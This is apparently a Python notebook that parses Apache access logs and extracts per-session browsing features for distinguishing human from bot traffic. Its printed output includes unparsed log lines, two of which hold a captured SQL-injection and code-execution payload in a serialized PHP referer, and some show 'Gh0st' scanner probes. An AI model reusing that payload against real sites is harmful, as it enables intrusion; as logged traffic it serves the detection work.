# %%
import re
from datetime import datetime
from numpy import std
import os


class PARSER:
    LOG_RE = re.compile(r'''
        (?P<host>\S+)\s+                # host (or -)
        (?P<ident>\S+)\s+               # ident (or -)
        \[(?P<time>[^\]]+)\]\s+         # [timestamp]
        "(?P<method>\S+)\s+(?P<path>[^"]+?)\s+(?P<proto>[^"]+)"\s+  # "METHOD path PROTO"
        (?P<status>\d{3})\s+            # status
        (?P<size>\S+)\s+                # size in bytes or -
        "(?P<referer>[^"]*)"\s+         # "referer" (may be empty)
        (?P<token>\S+)\s+               # custom token (session id or cookie)
        "(?P<agent>[^"]+)"              # "user-agent"
    ''', re.VERBOSE)

    def parse_apache_line(self,line):
        m = self.LOG_RE.search(line)
        if not m:
            print("-------line did not match expected format ---------\n",line)
            return 
        d = m.groupdict()
        # print(m)

        # parse time to datetime
        # example time format: 01/Nov/2019:16:32:09 +0000
        dt = datetime.strptime(d['time'], "%d/%b/%Y:%H:%M:%S %z")

        # normalize size
        size = None if d['size'] == '-' else int(d['size'])

        # Optional minimal UA parsing (heuristic)
        
        parsed = {
            'timestamp': dt,
            'method': d['method'],
            'path': d['path'],
            'protocol': d['proto'],
            'status': int(d['status']),
            'size': size,
            'referer': None if d['referer'] == '' else d['referer'],
            'session': d['token'],
        }
        return parsed
    

            

# Example usage:
line = '- - [01/Nov/2019:16:32:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 449 "https://160.40.52.164/content/big_data.php" htodnmm7tjpihgeuqk64c0gjes "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 OPR/64.0.3417.61"'
line2 = '- - [30/Oct/2019:09:42:02 +0000] "GET / HTTP/1.0" 200 2045 "-" - "-"'
line3 = '- - [30/Oct/2019:11:50:36 +0000] "GET / HTTP/1.1" 200 2770 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 OPR/64.0.3417.61"'
parser = PARSER()
print(parser.parse_apache_line(line))
# Out:
# {'timestamp': datetime.datetime(2019, 11, 1, 16, 32, 9, tzinfo=datetime.timezone.utc), 'method': 'POST', 'path': '/storage/store_sess_total_mousemv_db.php', 'protocol': 'HTTP/1.1', 'status': 200, 'size': 449, 'referer': 'https://160.40.52.164/content/big_data.php', 'session': 'htodnmm7tjpihgeuqk64c0gjes'}

# %%
class LOG_FEATURES:
    """
    features =  {
        Total_requests,
        Total_Bytes,
        Total_GET_requests,
        Total_POST_requests,
        Total_HEAD_requests,
        Total_3xx_responses
        Total_4xx_responses
        image requests,
        css file request,
        js requests
        HTML-to-image ratio
        Depth SD                     -> Standard deviation of requested pages’ depth (i.e., number of ’/’ in URLpath)
        Max requests per page        -> The maximum number of requests to the same page in a session [20].
        Average requests per page    -> The average number of requests per page in a session [20].
        Max number of consecutive sequential HTTP requests -> The maximum number of HTTP requested URLs that contain the previously requested URL as a subpart page [20, 43].
        % of consecutive sequential HTTP requests
        Session time                 -> The total time (in seconds) between the first and the last HTTP request of the session [3, 4, 20, 29, 34, 43].
        Browsing speed               -> The ratio of the total number of requested pages over time (in seconds)
        SD of inter-request times    -> Standard deviation of time between successive requests [4, 20].

    """
    session_features = {}
    feature_names = [
        "Total_requests","Total_Bytes","Total_GET_requests","Total_POST_requests",
        "Total_3xx_responses","Total_4xx_responses","image_requests","css_file_request",
        "js_requests","Depth_SD","Max_requests_per_page","Average_requests_per_page",
        "Max_sequential_request","per_sequential_requests","Session_time","Browsing_speed","SD_inter_request_time"
    ]
    global PARSER
    parser = PARSER()

    def init_features(self):
        new = {}
        for f_name in self.feature_names:
            new[f_name] = 0
        new["request_path"] = []
        new["requests_timestamps"] = []
        return new

    def is_image(self,path):
        ext_list = [".png",".jpeg",".webp",".svg"]
        for ext in ext_list:
            if path.endswith(".jpg") == True :
                return True
        return False

    def calculate_Depth_SD(self,session_id):
        depth_list = []
        for path in self.session_features[session_id]["request_path"]:
            depth_list.append(path.count('/'))
        # print("depth_list " ,depth_list)
        return std(depth_list)
    
    def inter_request_time_SD(self,session_id):
        time_dif_list = [0]
        sz = len(self.session_features[session_id]["requests_timestamps"])
        time_line = self.session_features[session_id]["requests_timestamps"]
        for i in range(1,sz):
            time_dif_list.append((time_line[i]-time_line[i-1]).total_seconds())
        # print("time sd ",time_dif_list)
        return std(time_dif_list)

    def get_request_stats(self,session_id):
        request_path_cnt = {}
        max_consecutive_len = 1
        cur_consecutive_len = 0
        cnt_consecutive_path = 0
        prev_path = ""
        for path in self.session_features[session_id]["request_path"]:
            if path in request_path_cnt:
                request_path_cnt[path]+=1
            else:
                request_path_cnt[path]=1
            
            if path.startswith(prev_path):
                cur_consecutive_len += 1
                cnt_consecutive_path += 1
                # print(cur_consecutive_len,path)
                max_consecutive_len = max(max_consecutive_len,cur_consecutive_len)
            else:
                cur_consecutive_len = 1

        total_req = 0
        max_req = 0
        for cnt in request_path_cnt.values():
            total_req+=cnt
            max_req = max(max_req,cnt)

        stats = {}
        tot_pages = len(request_path_cnt)
        stats["Max_requests_per_page"] = max_req
        stats["Average_requests_per_page"] = total_req/tot_pages
        stats["Max_sequential_request"] = max_consecutive_len
        stats["cnt_consecutive_path"] = cnt_consecutive_path
        if self.session_features[session_id]["Session_time"] != 0:
            stats["Browsing_speed"] = tot_pages / self.session_features[session_id]["Session_time"]
        else:
            stats["Browsing_speed"] = 0
        return stats


    def add_log(self,str_log):
        new_log_feature = self.parser.parse_apache_line(str_log)

        if new_log_feature==None or new_log_feature["session"] == '-' or (new_log_feature['method'] == 'POST' and new_log_feature['path'] == '/storage/store_sess_total_mousemv_db.php'):
            return
            
        session_id = new_log_feature["session"]
        if session_id not in self.session_features:
            self.session_features[session_id] =  self.init_features()
            self.session_features[session_id]["session_start"] = new_log_feature["timestamp"]

        """
        example new_log_feature = 
        {
         'timestamp': datetime.datetime(2019, 10, 30, 11, 50, 36, tzinfo=datetime.timezone.utc),
         'method': 'GET',
         'path': '/',
         'protocol': 'HTTP/1.1',
         'status': 200,
         'size': 2770,
         'referer': 'https://160.40.52.164/content/big_data.php',
         'token': 'htodnmm7tjpihgeuqk64c0gjes'
        }
        """
        
        self.session_features[session_id]["Total_requests"]      += 1
        self.session_features[session_id]["Total_Bytes"]         += new_log_feature["size"]
        self.session_features[session_id]["Total_GET_requests"]  += 1 if new_log_feature["method"]=="GET" else 0
        self.session_features[session_id]["Total_POST_requests"] += 1 if new_log_feature["method"]=="POST" else 0
        self.session_features[session_id]["Total_3xx_responses"] += 1 if new_log_feature["status"]//100 == 3 else 0
        self.session_features[session_id]["Total_4xx_responses"] += 1 if new_log_feature["status"]//100 == 4 else 0
        self.session_features[session_id]["image_requests"]      += 1 if self.is_image(new_log_feature["path"]) else 0
        self.session_features[session_id]["css_file_request"]    += 1 if new_log_feature["path"].endswith(".css") else 0
        self.session_features[session_id]["js_requests"]         += 1 if new_log_feature["path"].endswith(".js") else 0

        self.session_features[session_id]["request_path"].append(new_log_feature["path"])
        self.session_features[session_id]["requests_timestamps"].append(new_log_feature["timestamp"])
        
        self.session_features[session_id]["Depth_SD"] = self.calculate_Depth_SD(session_id)
        self.session_features[session_id]["Session_time"] = (new_log_feature["timestamp"] - self.session_features[session_id]["session_start"]).total_seconds()
        self.session_features[session_id]["SD_inter_request_time"] = self.inter_request_time_SD(session_id)
        self.session_features[session_id].update( self.get_request_stats(session_id) )

    def get_seseion_features_as_csv(self,session_id):
        feature_names = [
            "Total_requests","Total_Bytes","Total_GET_requests","Total_POST_requests",
            "Total_3xx_responses","Total_4xx_responses","image_requests","css_file_request",
            "js_requests","Depth_SD","Max_requests_per_page","Average_requests_per_page",
            "Max_sequential_request","per_sequential_requests","Session_time","Browsing_speed","SD_inter_request_time"
        ]
        features = self.session_features[session_id]
        out_str = f"""{session_id},{features["Total_requests"]},{features["Total_Bytes"]},{features["Total_GET_requests"]},{features["Total_POST_requests"]},{features["Total_3xx_responses"]/features["Total_requests"]},{features["Total_4xx_responses"]/features["Total_requests"]},{features["image_requests"]/features["Total_requests"]},{features["css_file_request"]/features["Total_requests"]},{features["js_requests"]/features["Total_requests"]},{features["Depth_SD"]},{features["Max_requests_per_page"]},{features["Average_requests_per_page"]},{features["Max_sequential_request"]},{features["cnt_consecutive_path"]/features["Total_requests"]},{features["Session_time"]},{features["Browsing_speed"]},{features["SD_inter_request_time"]}
"""

        return out_str

# %%
file_paths = ["../dataset/phase1/data/web_logs/humans","../dataset/phase2/data/web_logs/humans"]

log_features = LOG_FEATURES()

# %%
for path in file_paths:
    files = os.listdir(path)
    files = [f for f in files if os.path.isfile(path+'/'+f)]
    for file in files:
        with open(path+'/'+file,'r') as fd:
            for line in fd:
                log_features.add_log(line)
        print("done for ",path+'/'+file)

# log = """- - [25/Nov/2020:08:04:44 +0000] "GET / HTTP/1.1" 200 1147 "-" 0d5d2435pbn4mi4gj9spju5gia "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
# - - [25/Nov/2020:08:04:45 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 200 294 "http://192.168.1.120/" 0d5d2435pbn4mi4gj9spju5gia "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
# - - [25/Nov/2020:08:04:45 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 944 "http://192.168.1.120/" 0d5d2435pbn4mi4gj9spju5gia "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
# - - [25/Nov/2020:08:14:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 316 "http://192.168.1.120/" fas9mgeiptj5suoafcgt3cb6a6 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.320"
# - - [25/Nov/2020:08:14:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 316 "http://192.168.1.120/" fas9mgeiptj5suoafcgt3cb6a6 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.320"
# """
# log_list = log.splitlines()
# Out:
# -------line did not match expected format ---------
#  - - [29/Oct/2019:10:27:10 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:15:42:45 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:15:49:52 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:15:55:07 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:02:06 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:06:17 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:15:23 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:19:55 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:26:57 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:29:26 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:31:22 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:37:42 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:40:19 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:45:26 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:16:57:04 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:17:01:55 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:17:08:22 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:17:10:48 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:17:15:41 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:19:17:45 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:19:29:39 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:19:35:38 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:19:41:29 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:20:04:50 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:20:11:02 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:20:28:37 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:20:59:59 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:06:01 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:17:10 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:29:07 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:34:49 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:40:22 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:46:18 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:21:58:32 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:22:04:52 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:22:10:52 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:22:16:16 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:22:40:58 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:22:52:22 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:23:22:38 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:23:35:22 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:23:41:05 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Oct/2019:23:58:55 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Oct/2019:00:04:54 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Oct/2019:00:10:47 +0000] "-" 408 1511 "-" - "-"
#
# done for  ../dataset/phase1/data/web_logs/humans/access_1.log
# done for  ../dataset/phase1/data/web_logs/humans/access_2.log
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:06 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:06 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:07 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:07 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:07 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:17:48:42 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:18:53:06 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Oct/2019:22:33:41 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Oct/2019:00:53:15 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Oct/2019:00:53:20 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase1/data/web_logs/humans/access_3.log
# -------line did not match expected format ---------
#  - - [25/Oct/2019:08:29:56 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:08:29:56 +0000] "-" 408 1511 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:09:50:46 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:13:13:25 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:13:13:25 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:14:07:41 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:15:53:50 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Oct/2019:15:57:54 +0000] "-" 408 156 "-" - "-"
#
# done for  ../dataset/phase1/data/web_logs/humans/access_4.log
# -------line did not match expected format ---------
#  - - [24/Oct/2019:10:28:29 +0000] "-" 408 156 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Oct/2019:14:00:49 +0000] "-" 408 156 "-" - "-"
#
# done for  ../dataset/phase1/data/web_logs/humans/access_5.log
# -------line did not match expected format ---------
#  - - [01/Aug/2020:11:57:52 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_1-2_8.log
# -------line did not match expected format ---------
#  - - [10/Jul/2020:06:28:43 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [10/Jul/2020:16:15:57 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [10/Jul/2020:17:53:20 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:04:45:51 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:06:21:42 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_10-11_7.log
# -------line did not match expected format ---------
#  - - [10/Aug/2020:10:46:20 +0000] "\x16\x03\x03\x01\x11\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [10/Aug/2020:12:01:30 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_10-11_8.log
# -------line did not match expected format ---------
#  - - [11/Jul/2020:16:16:05 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:17:50:05 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:39 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:40 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:40 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:41 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:42 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:43 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Jul/2020:20:51:49 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [12/Jul/2020:04:45:58 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_11-12_7.log
# -------line did not match expected format ---------
#  - - [11/Aug/2020:11:36:34 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [11/Aug/2020:14:58:43 +0000] "\x16\x03\x03\x01\x11\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_11-12_8.log
# -------line did not match expected format ---------
#  - - [12/Jul/2020:16:15:50 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [12/Jul/2020:17:56:36 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [13/Jul/2020:04:46:08 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [13/Jul/2020:06:22:13 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_12-13_7.log
# -------line did not match expected format ---------
#  - - [13/Jul/2020:16:16:04 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [13/Jul/2020:17:53:03 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [14/Jul/2020:04:46:08 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [14/Jul/2020:06:21:39 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_13-14_7.log
# -------line did not match expected format ---------
#  - - [14/Jul/2020:16:15:55 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [15/Jul/2020:04:46:10 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [15/Jul/2020:05:49:15 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_14-15_7.log
# -------line did not match expected format ---------
#  - - [15/Jul/2020:15:05:20 +0000] "Gh0st\xad" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [15/Jul/2020:16:16:06 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [16/Jul/2020:04:47:14 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_15-16_7.log
# -------line did not match expected format ---------
#  - - [16/Jul/2020:16:15:55 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:52 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:53 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:56 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:56 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:57 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:00:59:58 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:01:00:24 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:04:46:22 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_16-17_7.log
# -------line did not match expected format ---------
#  - - [17/Jul/2020:09:39:54 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:10:40:01 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:12:40:14 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [17/Jul/2020:16:16:01 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [18/Jul/2020:04:46:04 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_17-18_7.log
# -------line did not match expected format ---------
#  - - [18/Jul/2020:16:16:10 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_18-19_7.log
# -------line did not match expected format ---------
#  - - [19/Jul/2020:14:28:54 +0000] "\x16\x03\x03\x01\x11\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_19-20_7.log
# -------line did not match expected format ---------
#  - - [02/Aug/2020:06:29:55 +0000] "Gh0st\xad" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [02/Aug/2020:12:13:54 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_2-3_8.log
# -------line did not match expected format ---------
#  - - [02/Jul/2020:06:34:01 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Jul/2020:19:23:57 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_2-5_7.log
# -------line did not match expected format ---------
#  - - [20/Jul/2020:07:11:08 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [21/Jul/2020:02:18:04 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [21/Jul/2020:05:12:07 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_20-21_7.log
# -------line did not match expected format ---------
#  - - [21/Jul/2020:07:46:02 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [21/Jul/2020:08:26:45 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_21-22_7.log
# -------line did not match expected format ---------
#  - - [22/Jul/2020:08:28:10 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:09:28:17 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:10:30:03 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:10:35:00 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:10:36:27 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:10:42:46 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:10:47:40 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:18:58 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:21:21 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:28:28 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:35:34 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:36:53 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:38:45 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:40:01 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
